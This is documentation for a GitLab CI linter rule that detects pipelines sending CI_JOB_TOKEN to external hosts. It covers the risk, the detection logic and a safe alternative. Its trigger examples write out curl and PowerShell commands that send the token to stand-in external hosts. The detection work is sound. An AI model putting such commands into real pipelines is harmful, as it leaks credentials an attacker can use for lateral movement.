# GL004 — CI_JOB_TOKEN exfiltration

**Severity:** `warn`  
**OWASP:** [CICD-SEC-6 – Insufficient Credential Hygiene](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-06-Insufficient-Credential-Hygiene)

## Risk

`CI_JOB_TOKEN` grants scoped access to your GitLab instance — it can read private repositories, trigger pipelines, and access the Package Registry. Sending it to an external host leaks credentials that an attacker can use to move laterally within your GitLab instance.

## What is flagged

A script line is flagged when **both** of the following are present on the same line:

1. `$CI_JOB_TOKEN` is referenced, in POSIX shell form (`$CI_JOB_TOKEN`, `${CI_JOB_TOKEN}`) or in PowerShell form (`$env:CI_JOB_TOKEN`, `${env:CI_JOB_TOKEN}`)
2. An explicit non-GitLab URL is also present (contains a hostname that is not `gitlab.com` or a `*.gitlab.com` subdomain)

Lines that only use `CI_JOB_TOKEN` with GitLab-native variables (`$CI_API_V4_URL`, `$CI_SERVER_URL`, `$CI_REGISTRY`) are not flagged.

When the URL has the shape of a GitLab instance's (`/api/v4/`, `/-/jobs/artifacts/` or `/trigger/pipeline` in its path, in any case), the host is most likely a self-hosted GitLab, and the message says so: `CI_JOB_TOKEN sent to hardcoded GitLab host "…"`. If that is the instance running the pipeline, use `$CI_API_V4_URL` or `$CI_SERVER_HOST` instead of the hostname, so the token can't go to another instance after the project moves or is forked. A clone URL with `gitlab-ci-token:` doesn't count: every job-token clone has it, also of a repository on another forge.

Each command of a `|` block is checked on its own, and only a word that is an http(s) URL counts as the destination: a URL in an `echo`, in a form value (`-F "x=https://example.com"`) or in another command of the block is not where the token goes. A host given by a variable (`${CI_SERVER_FQDN}`, `$CI_SERVER_HOST`) is unknown and not reported. The message names the host, not the URL's `user:password@` part.

## Trigger example

```yaml
upload:
  script:
    - 'curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://external-registry.example.com/upload'
```

```yaml
upload:
  tags: [windows]
  script:
    - 'Invoke-WebRequest -Headers @{"JOB-TOKEN"=$env:CI_JOB_TOKEN} https://example.com/upload'
```

## Safe alternative

```yaml
upload:
  script:
    # Use the GitLab Package Registry — stays on your instance
    - 'curl --header "JOB-TOKEN: $CI_JOB_TOKEN" "${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/generic/myapp/1.0/artifact.zip"'
```

## Notes

- Quote a script line that contains `: ` (as in `JOB-TOKEN: $CI_JOB_TOKEN`), or YAML reads it as a mapping instead of a command and GitLab rejects the file

- PowerShell variable names are case insensitive, so `$env:ci_job_token` is flagged too; POSIX shell variables are case sensitive, so a lowercase `$ci_job_token` in a POSIX command is a different variable and is not flagged
- GitLab.com and `*.gitlab.com` subdomains are always considered safe
- Self-hosted GitLab instances contacted via `$CI_SERVER_URL` or `$CI_API_V4_URL` are safe
- This rule does not flag token usage in `variables:` blocks — only in `script:`, `before_script:`, `after_script:`, and `run:` step scripts
